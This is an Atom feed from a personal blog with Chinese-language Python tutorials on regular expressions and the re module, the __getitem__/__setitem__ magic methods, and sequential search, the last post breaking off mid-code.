<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AdamZeng</title>
  
  <subtitle>start from zero</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://adamzeng.site/"/>
  <updated>2017-11-11T04:23:48.000Z</updated>
  <id>http://adamzeng.site/</id>
  
  <author>
    <name>AdamZeng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>正则表达式</title>
    <link href="http://adamzeng.site/2017/11/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://adamzeng.site/2017/11/10/正则表达式/</id>
    <published>2017-11-10T09:50:46.000Z</published>
    <updated>2017-11-11T04:23:48.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h3><p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。<a id="more"></a></p><p>非Python独有，re模块实现。</p><p>有一句总结：</p><p><em>尽量使用泛匹配模式，使用括号得到匹配目标，尽量使用非贪婪模式、有换行符就用re.S</em> 。</p><h3 id="正则表达式中常用的字符含义"><a href="#正则表达式中常用的字符含义" class="headerlink" title="正则表达式中常用的字符含义"></a>正则表达式中常用的字符含义</h3><p>####<strong>1、普通字符和11个元字符：</strong></p><table><thead><tr><th>普通字符</th><th>匹配自身</th><th>abc</th><th>abc</th></tr></thead><tbody><tr><td>.</td><td>匹配任意除换行符”\n”外的字符(在DOTALL模式中也能匹配换行符</td><td>a.c</td><td>abc</td></tr><tr><td>\</td><td>转义字符，使后一个字符改变原来的意思</td><td>a.c;a\c</td><td>a.c;a\c</td></tr><tr><td>*</td><td>匹配前一个字符0或多次</td><td>abc*</td><td>ab;abccc</td></tr><tr><td>+</td><td>匹配前一个字符1次或无限次</td><td>abc+</td><td>abc;abccc</td></tr><tr><td>?</td><td>匹配一个字符0次或1次</td><td>abc?</td><td>ab;abc</td></tr><tr><td>^</td><td>匹配字符串开头。在多行模式中匹配每一行的开头</td><td>^abc</td><td>abc</td></tr><tr><td>$</td><td>匹配字符串末尾，在多行模式中匹配每一行的末尾</td><td>abc$</td><td>abc</td></tr><tr><td>\</td><td></td><td>或。匹配\</td><td>左右表达式任意一个，从左到右匹配，如果\</td><td>没有包括在()中，则它的范围是整个正则表达式</td><td>abc\</td><td>def</td><td>abcdef</td></tr><tr><td>{}</td><td>{m}匹配前一个字符m次，{m,n}匹配前一个字符m至n次，若省略n，则匹配m至无限次</td><td>ab{1,2}c</td><td>abcabbc</td></tr><tr><td>[]</td><td>字符集。对应的位置可以是字符集中任意字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]。[^abc]表示取反，即非abc。所有特殊字符在字符集中都失去其原有的特殊含义。用\反斜杠转义恢复特殊字符的特殊含义。</td><td>a[bcd]e</td><td>abeaceade</td></tr><tr><td>()</td><td>被括起来的表达式将作为分组，从表达式左边开始没遇到一个分组的左括号“（”，编号+1.分组表达式作为一个整体，可以后接数量词。表达式中的\</td><td>仅在该组中有效。</td><td>(abc){2}a(123\</td><td>456)c</td><td>abcabca456c</td></tr></tbody></table><p>这里需要强调一下反斜杠\的作用：</p><ul><li>反斜杠后边跟元字符去除特殊功能；（即将特殊字符转义成普通字符）</li><li>反斜杠后边跟普通字符实现特殊功能；（即预定义字符）</li><li>引用序号对应的字组所匹配的字符串。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a=re.search(<span class="string">r'(tina)(fei)haha\2'</span>,<span class="string">'tinafeihahafei tinafeihahatina'</span>).group()</div><div class="line">print(a)</div><div class="line">结果：</div><div class="line">tinafeihahafei</div></pre></td></tr></table></figure><h4 id="2、预定义字符集（可以写在字符集-…-中）"><a href="#2、预定义字符集（可以写在字符集-…-中）" class="headerlink" title="2、预定义字符集（可以写在字符集[…]中） "></a><strong>2、预定义字符集（可以写在字符集[…]中） </strong></h4><table><thead><tr><th>\d</th><th>数字:[0-9]</th><th>a\bc</th><th>a1c</th></tr></thead><tbody><tr><td>\D</td><td>非数字:[^\d]</td><td>a\Dc</td><td>abc</td></tr><tr><td>\s</td><td>匹配任何空白字符:[&lt;空格&gt;\t\r\n\f\v]</td><td>a\sc</td><td>a c</td></tr><tr><td>\S</td><td>非空白字符:[^\s]</td><td>a\Sc</td><td>abc</td></tr><tr><td>\w</td><td>匹配包括下划线在内的任何字字符:[A-Za-z0-9_]</td><td>a\wc</td><td>abc</td></tr><tr><td>\W</td><td>匹配非字母字符，即匹配特殊字符</td><td>a\Wc</td><td>a c</td></tr><tr><td>\A</td><td>仅匹配字符串开头,同^</td><td>\Aabc</td><td>abc</td></tr><tr><td>\Z</td><td>仅匹配字符串结尾，同$</td><td>abc\Z</td><td>abc</td></tr><tr><td>\b</td><td>匹配\w和\W之间，即匹配单词边界匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td><td>\babc\ba\b!bc</td><td>空格abc空格a!bc</td></tr><tr><td>\B</td><td>[^\b]</td><td>a\Bbc</td><td>abc</td></tr></tbody></table><p><strong>3、特殊分组用法：</strong></p><table><thead><tr><th>(?P<name>)</name></th><th>分组，除了原有的编号外再指定一个额外的别名</th><th>(?P<id>abc){2}</id></th><th>abcabc</th></tr></thead><tbody><tr><td>(?P=name)</td><td>引用别名为<name>的分组匹配到字符串</name></td><td>(?P<id>\d)abc(?P=id)</id></td><td>1abc15abc5</td></tr><tr><td>\<number></number></td><td>引用编号为<number>的分组匹配到字符串</number></td><td>(\d)abc\1</td><td>1abc15abc5</td></tr></tbody></table><p>###Python中re模块</p><p><strong>1、compile()</strong></p><p>编译正则表达式模式，返回一个对象的模式。（可以把那些常用的正则表达式编译成正则表达式对象，这样可以提高一点效率。）</p><p>格式：</p><p>re.compile(pattern,flags=0)</p><p>pattern: 编译时用的表达式字符串。</p><p>flags 编译标志位，用于修改正则表达式的匹配方式，如：是否区分大小写，多行匹配等。常用的flags有：</p><table><thead><tr><th>标志</th><th>含义</th></tr></thead><tbody><tr><td>re.S(DOTALL)</td><td>使.匹配包括换行在内的所有字符</td></tr><tr><td>re.I（IGNORECASE）</td><td>使匹配对大小写不敏感</td></tr><tr><td>re.L（LOCALE）</td><td>做本地化识别（locale-aware)匹配，法语等<img src="file:///C:/Users/tina/AppData/Local/YNote/data/heoffer@126.com/15ef610b4afd4cf0aea99402f970595e/19c23298f53f40f1b1d0168871156605.jpg" alt="img"></td></tr><tr><td>re.M(MULTILINE)</td><td>多行匹配，影响^和$</td></tr><tr><td>re.X(VERBOSE)</td><td>该标志通过给予更灵活的格式以便将正则表达式写得更易于理解</td></tr><tr><td>re.U</td><td>根据Unicode字符集解析字符，这个标志影响\w,\W,\b,\B</td></tr></tbody></table><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import re</div><div class="line">tt = &quot;Tina is a good girl, she is cool, clever, and so on...&quot;</div><div class="line">rr = re.compile(r&apos;\w*oo\w*&apos;)</div><div class="line">print(rr.findall(tt))   #查找所有包含&apos;oo&apos;的单词</div><div class="line">执行结果如下：</div><div class="line">[&apos;good&apos;, &apos;cool&apos;]</div></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><p><strong>2、match()</strong></p><p>决定RE是否在字符串刚开始的位置匹配。//注：这个方法并不是完全匹配。当pattern结束时若string还有剩余字符，仍然视为成功。想要完全匹配，可以在表达式末尾加上边界匹配符’$’</p><p>格式：</p><p>re.match(pattern, string, flags=0)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">print(re.match(&apos;com&apos;,&apos;comwww.runcomoob&apos;).group())</div><div class="line">print(re.match(&apos;com&apos;,&apos;Comwww.runcomoob&apos;,re.I).group())</div><div class="line">执行结果如下：</div><div class="line">com</div><div class="line">com</div></pre></td></tr></table></figure><p><strong>3、search()</strong></p><p> 格式：</p><p>re.search(pattern, string, flags=0)</p><p>re.search函数会在字符串内查找模式匹配,只要找到第一个匹配然后返回，如果字符串没有匹配，则返回None。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">print(re.search(&apos;\dcom&apos;,&apos;www.4comrunoob.5com&apos;).group())</div><div class="line">执行结果如下：</div><div class="line">4com</div></pre></td></tr></table></figure><p>*注：match和search一旦匹配成功，就是一个match object对象，而match object对象有以下方法：</p><ul><li>group() 返回被 RE 匹配的字符串</li><li>start() 返回匹配开始的位置</li><li>end() 返回匹配结束的位置</li><li>span() 返回一个元组包含匹配 (开始,结束) 的位置</li><li>group() 返回re整体匹配的字符串，可以一次输入多个组号，对应组号匹配的字符串。</li></ul><p>a. group（）返回re整体匹配的字符串，<br>b. group (n,m) 返回组号为n，m所匹配的字符串，如果组号不存在，则返回indexError异常<br>c.groups（）groups() 方法返回一个包含正则表达式中所有小组字符串的元组，从 1 到所含的小组号，通常groups()不需要参数，返回一个元组，元组中的元就是正则表达式中定义的组。 </p><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import re</div><div class="line">a = &quot;123abc456&quot;</div><div class="line"> print(re.search(&quot;([0-9]*)([a-z]*)([0-9]*)&quot;,a).group(0))   #123abc456,返回整体</div><div class="line"> print(re.search(&quot;([0-9]*)([a-z]*)([0-9]*)&quot;,a).group(1))   #123</div><div class="line"> print(re.search(&quot;([0-9]*)([a-z]*)([0-9]*)&quot;,a).group(2))   #abc</div><div class="line"> print(re.search(&quot;([0-9]*)([a-z]*)([0-9]*)&quot;,a).group(3))   #456</div><div class="line">###group(1) 列出第一个括号匹配部分，group(2) 列出第二个括号匹配部分，group(3) 列出第三个括号匹配部分。###</div></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><p><strong>4、findall()</strong></p><p>re.findall遍历匹配，可以获取字符串中所有匹配的字符串，返回一个列表。</p><p> 格式：</p><p>re.findall(pattern, string, flags=0)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">p = re.compile(r&apos;\d+&apos;)</div><div class="line">print(p.findall(&apos;o1n2m3k4&apos;))</div><div class="line">执行结果如下：</div><div class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;]</div></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import re</div><div class="line">tt = &quot;Tina is a good girl, she is cool, clever, and so on...&quot;</div><div class="line">rr = re.compile(r&apos;\w*oo\w*&apos;)</div><div class="line">print(rr.findall(tt))</div><div class="line">print(re.findall(r&apos;(\w)*oo(\w)&apos;,tt))#()表示子表达式 </div><div class="line">执行结果如下：</div><div class="line">[&apos;good&apos;, &apos;cool&apos;]</div><div class="line">[(&apos;g&apos;, &apos;d&apos;), (&apos;c&apos;, &apos;l&apos;)]</div></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><p><strong>5、finditer()</strong></p><p> 搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。找到 RE 匹配的所有子串，并把它们作为一个迭代器返回。</p><p>格式：</p><p>re.finditer(pattern, string, flags=0)</p><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">iter = re.finditer(r&apos;\d+&apos;,&apos;12 drumm44ers drumming, 11 ... 10 ...&apos;)</div><div class="line">for i in iter:</div><div class="line">    print(i)</div><div class="line">    print(i.group())</div><div class="line">    print(i.span())</div><div class="line">执行结果如下：</div><div class="line">&lt;_sre.SRE_Match object; span=(0, 2), match=&apos;12&apos;&gt;</div><div class="line">12</div><div class="line">(0, 2)</div><div class="line">&lt;_sre.SRE_Match object; span=(8, 10), match=&apos;44&apos;&gt;</div><div class="line">44</div><div class="line">(8, 10)</div><div class="line">&lt;_sre.SRE_Match object; span=(24, 26), match=&apos;11&apos;&gt;</div><div class="line">11</div><div class="line">(24, 26)</div><div class="line">&lt;_sre.SRE_Match object; span=(31, 33), match=&apos;10&apos;&gt;</div><div class="line">10</div><div class="line">(31, 33)</div></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><p><strong>6、split()</strong></p><p>按照能够匹配的子串将string分割后返回列表。</p><p>可以使用re.split来分割字符串，如：re.split(r’\s+’, text)；将字符串按空格分割成一个单词列表。</p><p>格式：</p><p>re.split(pattern, string[, maxsplit])</p><p>maxsplit用于指定最大分割次数，不指定将全部分割。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">print(re.split(&apos;\d+&apos;,&apos;one1two2three3four4five5&apos;))</div><div class="line">执行结果如下：</div><div class="line">[&apos;one&apos;, &apos;two&apos;, &apos;three&apos;, &apos;four&apos;, &apos;five&apos;, &apos;&apos;]</div></pre></td></tr></table></figure><p><strong>7、sub()</strong></p><p>使用re替换string中每一个匹配的子串后返回替换后的字符串。</p><p>格式：</p><p>re.sub(pattern, repl, string, count)</p><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">import re</div><div class="line">text = &quot;JGood is a handsome boy, he is cool, clever, and so on...&quot;</div><div class="line">print(re.sub(r&apos;\s+&apos;, &apos;-&apos;, text))</div><div class="line">执行结果如下：</div><div class="line">JGood-is-a-handsome-boy,-he-is-cool,-clever,-and-so-on...</div></pre></td></tr></table></figure><p>其中第二个函数是替换后的字符串；本例中为’-‘</p><p>第四个参数指替换个数。默认为0，表示每个匹配项都替换。</p><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><p>re.sub还允许使用函数对匹配项的替换进行复杂的处理。</p><p>如：re.sub(r’\s’, lambda m: ‘[‘ + m.group(0) + ‘]’, text, 0)；将字符串中的空格’ ‘替换为’[ ]’。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">import re</div><div class="line">text = &quot;JGood is a handsome boy, he is cool, clever, and so on...&quot;</div><div class="line">print(re.sub(r&apos;\s+&apos;, lambda m:&apos;[&apos;+m.group(0)+&apos;]&apos;, text,0))</div><div class="line">执行结果如下：</div><div class="line">JGood[ ]is[ ]a[ ]handsome[ ]boy,[ ]he[ ]is[ ]cool,[ ]clever,[ ]and[ ]so[ ]on...</div></pre></td></tr></table></figure><p><strong>8、subn()</strong></p><p> 返回替换次数</p><p>格式：</p><p>subn(pattern, repl, string, count=0, flags=0)</p><p><a href="javascript:void(0" target="_blank" rel="external"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">print(re.subn(&apos;[1-2]&apos;,&apos;A&apos;,&apos;123456abcdef&apos;))</div><div class="line">print(re.sub(&quot;g.t&quot;,&quot;have&quot;,&apos;I get A,  I got B ,I gut C&apos;))</div><div class="line">print(re.subn(&quot;g.t&quot;,&quot;have&quot;,&apos;I get A,  I got B ,I gut C&apos;))</div><div class="line">执行结果如下：</div><div class="line">(&apos;AA3456abcdef&apos;, 2)</div><div class="line">I have A,  I have B ,I have C</div><div class="line">(&apos;I have A,  I have B ,I have C&apos;, 3)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;什么是正则表达式&quot;&gt;&lt;a href=&quot;#什么是正则表达式&quot; class=&quot;headerlink&quot; title=&quot;什么是正则表达式&quot;&gt;&lt;/a&gt;什么是正则表达式&lt;/h3&gt;&lt;p&gt;正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。
    
    </summary>
    
      <category term="正则表达式" scheme="http://adamzeng.site/categories/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    
      <category term="正则表达式" scheme="http://adamzeng.site/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>__getitem__ and __setitem__</title>
    <link href="http://adamzeng.site/2017/11/09/getitem-and-setitem/"/>
    <id>http://adamzeng.site/2017/11/09/getitem-and-setitem/</id>
    <published>2017-11-09T09:06:28.000Z</published>
    <updated>2017-11-09T09:08:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用一个例子来解释python之 <strong>getattr</strong>、<strong>getattr</strong>、<strong>getitem</strong>、<strong>setitem</strong> 使用：<a id="more"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">__getattr__内置使用点号获取实例属性属性如 s.name，自调用__getattr__</div><div class="line">__setattr__设置类实例属性 如s.name=<span class="string">'tom'</span>，自调用__setattr__</div><div class="line">__getitem__ 使用[]获取实例属性 如s[<span class="string">'name'</span>]，自调用__getitem__</div><div class="line">__setitem__ 使用[]设置实例属性如 s[<span class="string">'name'</span>] = <span class="string">'tom'</span> ，自调用__setitem__</div><div class="line">__dict__ 为参数字典</div></pre></td></tr></table></figure><p>如下代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, item)</span>:</span></div><div class="line">        <span class="keyword">return</span> item + <span class="string">' is not exits'</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, key, value)</span>:</span></div><div class="line">        self.__dict__[key] = value</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, item)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.__dict__[item]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self, key, value)</span>:</span></div><div class="line">        self.__dict__[key] = value</div><div class="line"></div><div class="line"></div><div class="line">s = Student()</div><div class="line">print(s.name)  <span class="comment"># 调用__getattr__方法 输出'name is not exits'</span></div><div class="line">s.age = <span class="number">1</span>  <span class="comment"># 调用__setattr__ 方法</span></div><div class="line">print(s.age)  <span class="comment"># 输出 1</span></div><div class="line">print(s[<span class="string">'age'</span>])  <span class="comment"># 调用 __getitem__方法 输出1</span></div><div class="line">s[<span class="string">'name'</span>] = <span class="string">'tom'</span>  <span class="comment"># 调用 __setitem__ 方法</span></div><div class="line">print(s[<span class="string">'name'</span>])  <span class="comment"># 调用 __getitem__ 方法 输出 'tom'</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用一个例子来解释python之 &lt;strong&gt;getattr&lt;/strong&gt;、&lt;strong&gt;getattr&lt;/strong&gt;、&lt;strong&gt;getitem&lt;/strong&gt;、&lt;strong&gt;setitem&lt;/strong&gt; 使用：
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>排序和搜索</title>
    <link href="http://adamzeng.site/2017/11/07/%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/"/>
    <id>http://adamzeng.site/2017/11/07/排序和搜索/</id>
    <published>2017-11-07T07:09:27.000Z</published>
    <updated>2017-11-09T09:12:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul><li>能够解释和实现顺序查找和二分查找<a id="more"></a></li><li>能够解释和实现选择排序，冒泡排序，归并排序，快速排序，插入排序和shell排序</li><li>理解哈希作为搜索技术的思想</li><li>引入映射数据类型</li><li>使用哈希实现Map抽象数据类型</li></ul><p>我们现在把注意力转向计算中经常出现的一些问题，即搜索和排序问题。在本节中，我们将研究搜索。我们将在本章后面的章节中介绍。搜索是在项集合中查找特定项的算法过程。搜索通常对于项是否存在返回True或False。有时它可能返回项被找到的地方。我们在这里将仅关注成员是否存在这个问题。</p><p>在Python中，有一个非常简单的方法来询问一个项是否在一个项列表中。我们使用in运算符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">15</span> <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>]</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span> <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>]</div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure><p>这很容易写，一个底层的操作替我们完成这个工作。事实证明，有很多不同的方法来搜索。我们在这里感兴趣的是这些算法如何工作以及它们如何相互比较。</p><h3 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h3><p>当数据存储在诸如列表的集合中时，我们说它们具有线性或顺序关系。每个数据项都存储在相对于其他数据项的位置。在Python列表中，这些相对位置是单个项的索引值。由于这些索引值是有序的，我们可以按顺序访问它们。这个过程产生我们的第一种搜索技术 <code>顺序查找</code>。</p><p>Figure 1展示了这种搜索的工作原理。从列表中的第一个项目开始，我们按照基本的顺序排序，简单地从一个项移动到另一个项，直到找到我们正在寻找的项或遍历完整个列表。如果我们遍历完整个列表，则说明正在搜索的项不存在。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.3.%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/assets/5.3.%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p>该算法的Python实现见CodeLens 1。该函数需要一个列表和我们正在寻找的项作为参数，并返回一个是否存在的布尔值。found布尔变量初始化为False，如果我们发现列表中的项，则赋值为    True。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sequentialSearch</span><span class="params">(alist,item)</span>:</span></div><div class="line">    pos=<span class="number">0</span></div><div class="line">    found=<span class="keyword">False</span></div><div class="line">    <span class="keyword">while</span> pos&lt;len(alist) <span class="keyword">and</span> <span class="keyword">not</span> found:</div><div class="line">        <span class="keyword">if</span> alist[pos]==item:</div><div class="line">            found=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            pos=pos+<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> found</div><div class="line"></div><div class="line">  </div><div class="line">testlist = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">42</span>, <span class="number">13</span>, <span class="number">0</span>]</div><div class="line">print(sequentialSearch(testlist, <span class="number">3</span>))</div><div class="line">print(sequentialSearch(testlist, <span class="number">13</span>))</div></pre></td></tr></table></figure><p><em>CodeLens 1</em></p><h3 id="顺序查找分析"><a href="#顺序查找分析" class="headerlink" title="顺序查找分析"></a>顺序查找分析</h3><p>为了分析搜索算法，我们需要定一个基本计算单位。回想一下，这通常是为了解决问题要重复的共同步骤。对于搜索，计算比较操作数是有意义的。每个比较都有可能找到我们正在寻找的项目。此外，我们在这里做另一个假设。项列表不以任何方式排序。项随机放置到列表中。换句话说，项在列表任何位置的概率是一样的。</p><p>如果项不在列表中，知道它的唯一方法是将其与存在的每个项进行比较。如果有n个项，则顺序查找需要n个比较来发现项不存在。在项在列表中的情况下，分析不是那么简单。实际上有三种不同的情况可能发生。在最好的情况下，我们在列表的开头找到所需的项，只需要一个比较。在最坏的情况下，我们直到最后的比较才找到项，第n个比较。</p><p>平均情况怎么样？平均来说，我们会在列表的一般找到该项；也就是说，我们将比较n/2项。然而，回想一下，当n变大时，系数，无论它们是什么，在我们的近似中变得不重要，因此顺序查找的复杂度是O(n)。</p><p>Table 1总结了这些结果。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.3.%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/assets/5.3.%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE.table1.png" alt="image"></p><p><em>Table 1</em></p><p>我们之前假设，我们列表中的项是随机放置的，因此在项之间没有顺序。如果项以某种方式排序，顺序查找会发生什么？我们能够在搜索技术中取得更好的效率吗？</p><p>假设项的列表按升序排列。如果我们正在寻找的项存在于列表中，它在n个位置中的概率依旧相同。我们仍然会有相同数量的比较来找到该项。然而，如果该项不存在，则有一些优点。Figure 2展示了这个过程，寻找项50。注意项仍然按顺序进行比较直到54。此时，我们知道一些额外的东西。不仅54不是我们正在寻找的项，也没有超过54的其他元素可以匹配到该项，因为列表是有序的。在这种情况下，算法不必继续查看所有项。它可以立即停止。CodeLens 2展示了顺序查找功能的这种变化。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.3.%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/assets/5.3.%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE.figure2.png" alt="image"></p><p><em>Figure 2</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">orderedSequentialSearch</span><span class="params">(alist,item)</span>:</span></div><div class="line">    pos=<span class="number">0</span></div><div class="line">    found=<span class="keyword">False</span></div><div class="line">    stop=<span class="keyword">False</span></div><div class="line">    <span class="keyword">while</span> pos&lt;len(alist) <span class="keyword">and</span> <span class="keyword">not</span> found <span class="keyword">and</span> <span 